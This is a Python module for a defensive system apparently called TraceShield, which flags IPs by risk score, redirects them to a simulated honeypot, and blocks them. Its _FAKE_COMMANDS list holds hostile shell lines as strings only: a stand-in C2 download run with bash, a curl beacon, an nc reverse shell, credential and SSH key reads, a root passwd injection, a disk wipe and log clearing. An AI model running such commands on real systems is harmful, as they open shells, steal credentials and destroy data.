"""
response_engine.py — Tiered automated response engine for TraceShield.

Risk tiers and actions:
    NORMAL       (0-30)  → no action
    SUSPICIOUS   (30-70) → flag and monitor
    HIGH_RISK    (70-90) → redirect to honeypot
    EXTREME_RISK (>90)   → block IP immediately

Cooldown:
    Blocked IPs are automatically unblocked after BLOCK_COOLDOWN_SECONDS.

All actions are simulated (no real network blocking).
"""

import logging
import random
import string
from datetime import datetime, timedelta
from typing import Dict, Optional

from ingestion.db.neo4j_conn import get_driver

logger = logging.getLogger(__name__)

BLOCK_COOLDOWN_SECONDS = 300
EXTREME_RISK_THRESHOLD = 60.0
HIGH_RISK_THRESHOLD    = 40.0


# ── In-memory state ───────────────────────────────────────────────────────────

class BlockedEntry:
    def __init__(self, reason: str, timestamp: datetime):
        self.reason    = reason
        self.timestamp = timestamp

    def is_expired(self) -> bool:
        return (datetime.utcnow() - self.timestamp).total_seconds() > BLOCK_COOLDOWN_SECONDS

    def expires_at(self) -> str:
        return (self.timestamp + timedelta(seconds=BLOCK_COOLDOWN_SECONDS)).isoformat()


class HoneypotEntry:
    def __init__(self, honeypot_id: str, reason: str, timestamp: datetime):
        self.honeypot_id       = honeypot_id
        self.reason            = reason
        self.timestamp         = timestamp
        self.interaction_count = 0
        self.fake_data_accessed: list = []

    def add_interaction(self, fake_data: str) -> None:
        self.interaction_count += 1
        self.fake_data_accessed.append(fake_data)


_blocked:  Dict[str, BlockedEntry]  = {}
_honeypot: Dict[str, HoneypotEntry] = {}
_flagged:  Dict[str, dict]          = {}   # ip → {count, reason, timestamp}


# ── State queries ─────────────────────────────────────────────────────────────

def _cleanup_expired_blocks() -> None:
    expired = [ip for ip, e in _blocked.items() if e.is_expired()]
    for ip in expired:
        logger.info("UNBLOCKED (cooldown expired) | ip=%s", ip)
        del _blocked[ip]


def is_blocked(ip: str) -> bool:
    _cleanup_expired_blocks()
    return ip in _blocked


def unblock(ip: str) -> bool:
    """Lift a block ahead of its cooldown. Returns False if the IP wasn't blocked."""
    if ip not in _blocked:
        return False
    del _blocked[ip]
    logger.info("UNBLOCKED (manual) | ip=%s", ip)
    return True


def reset_state() -> dict:
    """Drop every mitigation record. Returns what was cleared."""
    counts = {
        "blocked":   len(_blocked),
        "honeypots": len(_honeypot),
        "flagged":   len(_flagged),
    }
    _blocked.clear()
    _honeypot.clear()
    _flagged.clear()
    _used_commands.clear()
    logger.warning("RESPONSE STATE RESET | %s", counts)
    return counts


def get_full_state() -> dict:
    _cleanup_expired_blocks()
    return {
        "blocked_ips": {
            ip: {
                "reason":     e.reason,
                "blocked_at": e.timestamp.isoformat(),
                "expires_at": e.expires_at(),
                "status":     "active",
            }
            for ip, e in _blocked.items()
        },
        "honeypot_ips": {
            ip: {
                "honeypot_id":       h.honeypot_id,
                "reason":            h.reason,
                "redirected_at":     h.timestamp.isoformat(),
                "interaction_count": h.interaction_count,
                "fake_data_accessed": h.fake_data_accessed[-5:],  # last 5
            }
            for ip, h in _honeypot.items()
        },
        "flagged_ips": {
            ip: {
                "flag_count": v["count"],
                "reason":     v["reason"],
                "last_seen":  v["timestamp"],
            }
            for ip, v in _flagged.items()
        },
    }


# ── Actions ───────────────────────────────────────────────────────────────────

def _flag(ip: str, reason: str) -> None:
    if ip not in _flagged:
        _flagged[ip] = {"count": 0, "reason": reason, "timestamp": ""}
    _flagged[ip]["count"] += 1
    _flagged[ip]["reason"] = reason
    _flagged[ip]["timestamp"] = datetime.utcnow().isoformat()
    logger.warning("FLAGGED | ip=%s reason=%s flag_count=%d",
                   ip, reason, _flagged[ip]["count"])


def _redirect_honeypot(ip: str, reason: str) -> str:
    """Redirect IP to honeypot. Returns honeypot_id."""
    if ip in _honeypot:
        # Already in honeypot — add another interaction
        entry = _honeypot[ip]
        fake = _fake_data(ip)
        entry.add_interaction(fake)
        logger.warning("HONEYPOT INTERACTION | ip=%s honeypot=%s interaction=%d fake=%s",
                       ip, entry.honeypot_id, entry.interaction_count, fake)
        _store_honeypot_interaction(ip, entry.honeypot_id, fake)
        return entry.honeypot_id

    hid = "honeypot_" + "".join(random.choices(string.ascii_lowercase, k=6))
    entry = HoneypotEntry(hid, reason, datetime.utcnow())
    fake = _fake_data(ip)
    entry.add_interaction(fake)
    _honeypot[ip] = entry

    logger.warning(
        "REDIRECTED TO HONEYPOT | ip=%s honeypot=%s reason=%s fake_cmd=%s [SIMULATED]",
        ip, hid, reason, fake
    )
    _store_honeypot_in_neo4j(ip, hid, reason, fake)
    return hid


def _block(ip: str, reason: str) -> None:
    if ip in _blocked:
        logger.info("IP already blocked | ip=%s", ip)
        return
    entry = BlockedEntry(reason, datetime.utcnow())
    _blocked[ip] = entry
    logger.warning(
        "IP BLOCKED | ip=%s reason=%s expires_at=%s [SIMULATED]",
        ip, reason, entry.expires_at()
    )
    _store_block_in_neo4j(ip, reason)


# ── Fake data generator ───────────────────────────────────────────────────────

_FAKE_COMMANDS = [
    "cat /etc/shadow",
    "cat /etc/passwd",
    "wget http://c2.example.com/payload.sh -O /tmp/p.sh && bash /tmp/p.sh",
    "curl -s http://malicious.example.com/beacon?id=$(hostname)",
    "nc -e /bin/bash 10.0.0.1 4444",
    "ls -la /root/.ssh && cat /root/.ssh/id_rsa",
    "chmod 777 /etc/passwd && echo 'hacked::0:0::/root:/bin/bash' >> /etc/passwd",
    "sudo su -c 'id && whoami'",
    "python3 -c \"import socket,subprocess,os; s=socket.socket(); s.connect(('10.0.0.1',4444))\"",
    "find / -name '*.pem' -o -name '*.key' 2>/dev/null",
    "crontab -l && echo '* * * * * curl http://c2.example.com/ping' | crontab -",
    "iptables -F && iptables -X",
    "dd if=/dev/urandom of=/dev/sda bs=512 count=1",
    "rm -rf /var/log/* && history -c",
]

_used_commands: dict = {}   # ip → set of used indices

def _fake_data(ip: str) -> str:
    """Return a non-repeating fake command per IP."""
    if ip not in _used_commands:
        _used_commands[ip] = set()
    used = _used_commands[ip]
    available = [i for i in range(len(_FAKE_COMMANDS)) if i not in used]
    if not available:
        _used_commands[ip] = set()
        available = list(range(len(_FAKE_COMMANDS)))
    idx = random.choice(available)
    _used_commands[ip].add(idx)
    return _FAKE_COMMANDS[idx]


# ── Neo4j persistence ─────────────────────────────────────────────────────────

def _store_block_in_neo4j(ip: str, reason: str) -> None:
    driver = get_driver()
    if not driver:
        return
    try:
        with driver.session() as s:
            s.run(
                "MERGE (i:IP {address: $ip}) "
                "MERGE (sys:System {name: 'TraceShield'}) "
                "CREATE (i)-[:BLOCKED {reason: $reason, timestamp: $ts, "
                "cooldown_seconds: $cd}]->(sys)",
                ip=ip, reason=reason,
                ts=datetime.utcnow().isoformat(),
                cd=BLOCK_COOLDOWN_SECONDS,
            )
        logger.info("Neo4j: BLOCKED stored | ip=%s", ip)
    except Exception as e:
        logger.warning("Neo4j block store failed: %s", e)


def _store_honeypot_in_neo4j(ip: str, hid: str, reason: str, fake: str) -> None:
    driver = get_driver()
    if not driver:
        return
    try:
        with driver.session() as s:
            s.run(
                "MERGE (i:IP {address: $ip}) "
                "MERGE (h:Honeypot {name: $hid}) "
                "CREATE (i)-[:INTERACTED_WITH {"
                "  reason: $reason, timestamp: $ts, fake_data: $fake"
                "}]->(h)",
                ip=ip, hid=hid, reason=reason,
                ts=datetime.utcnow().isoformat(), fake=fake,
            )
        logger.info("Neo4j: INTERACTED_WITH honeypot stored | ip=%s hid=%s", ip, hid)
    except Exception as e:
        logger.warning("Neo4j honeypot store failed: %s", e)


def _store_honeypot_interaction(ip: str, hid: str, fake: str) -> None:
    driver = get_driver()
    if not driver:
        return
    try:
        with driver.session() as s:
            s.run(
                "MATCH (i:IP {address: $ip})-[r:INTERACTED_WITH]->(h:Honeypot {name: $hid}) "
                "SET r.interaction_count = coalesce(r.interaction_count, 1) + 1, "
                "    r.last_fake_data = $fake, r.last_seen = $ts",
                ip=ip, hid=hid, fake=fake, ts=datetime.utcnow().isoformat(),
            )
    except Exception as e:
        logger.warning("Neo4j interaction update failed: %s", e)


# ── Main dispatcher ───────────────────────────────────────────────────────────

def execute_response(ip: str, risk_score: float,
                     status: str, components: dict) -> dict:
    """
    Execute tiered automated response — strictly follows status.

    NORMAL       → no action
    SUSPICIOUS   → flag
    HIGH_RISK    → honeypot only  (score 70–90)
    EXTREME_RISK → block + honeypot (score >= 90)
    """
    reason = _build_reason(components)
    actions_taken = []
    honeypot_id   = None

    if status == "NORMAL":
        pass

    elif status == "SUSPICIOUS":
        _flag(ip, reason)
        actions_taken.append("flagged")

    elif status == "HIGH_RISK":
        honeypot_id = _redirect_honeypot(ip, reason)
        actions_taken.append("redirected_to_honeypot")

    elif status == "EXTREME_RISK":
        _block(ip, reason)
        actions_taken.append("blocked")
        honeypot_id = _redirect_honeypot(ip, reason)
        actions_taken.append("redirected_to_honeypot")

    hp = _honeypot.get(ip)
    bl = _blocked.get(ip)

    logger.info(
        "RESPONSE | ip=%s status=%s score=%.1f actions=%s",
        ip, status, risk_score, actions_taken
    )

    return {
        "actions_taken":          actions_taken,
        "blocked":                ip in _blocked,
        "redirected_to_honeypot": ip in _honeypot,
        "honeypot_id":            hp.honeypot_id if hp else honeypot_id,
        "flag_count":             _flagged.get(ip, {}).get("count", 0),
        "reason":                 reason,
        "block_expires_at":       bl.expires_at() if bl else None,
        "honeypot_interactions":  hp.interaction_count if hp else 0,
    }



def _build_reason(components: dict) -> str:
    parts = []
    if components.get("spike_score", 0) > 70:
        parts.append(f"spike={components['spike_score']:.1f}")
    if components.get("trend_score", 0) > 60:
        parts.append(f"trend={components['trend_score']:.1f}")
    if components.get("ml_score", 0) >= 60:
        parts.append(f"ml={components['ml_score']:.1f}")
    if components.get("temporal_score", 0) >= 50:
        parts.append(f"rate={components['temporal_score']:.1f}")
    return "+".join(parts) if parts else "combined_score"
